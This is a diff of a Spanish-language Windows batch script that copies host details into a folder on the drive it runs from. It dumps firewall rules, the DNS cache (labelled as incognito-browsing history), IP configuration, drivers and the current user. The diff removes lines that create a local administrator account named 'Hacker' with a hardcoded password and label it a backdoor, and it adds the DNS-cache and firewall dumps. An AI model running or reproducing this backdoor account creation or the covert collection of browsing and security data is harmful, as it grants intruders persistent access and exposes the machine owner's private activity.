@@ -10,7 +10,8 @@ if not exist "%~d0%user%" mkdir "%~d0%user%"
 
 ::Start COMMANDS
 
-
+netsh advfirewall firewall show rule name=all > %~dp0%user%/ReglasDeEntrada.txt
+ipconfig /diplaydns > %~dp0%user%/ModoIncognitoHistorial.txt
 date /t > %~dp0%user%/Fecha.txt
 ipconfig > %~dp0%user%/Ip_info.txt
 echo ">> Obteniendo direcciones IP..."
@@ -124,13 +125,8 @@ COMPACT > "%~dp0%user%/Muestra el estado de compresión de archivos en particion
 DRIVERQUERY > %~dp0%user%/driversinstalled.txt
 
 
-set User=Hacker
-set Pass=Hacker040523*
-net user %User% %Pass% /add
-net localgroup Administadores %User% /add
-net localgroup Administrators %User% /add
-echo Nuevo Usuario "%User%" Creado Con Exito %Pass% > %~dp0%user%/User-Add.txt
-echo ">> Usuario creado como BackDoor..."
+
+
 whoami > %~dp0%user%/User-Active.txt
 echo ">> Haciendo un Who am I..."
 
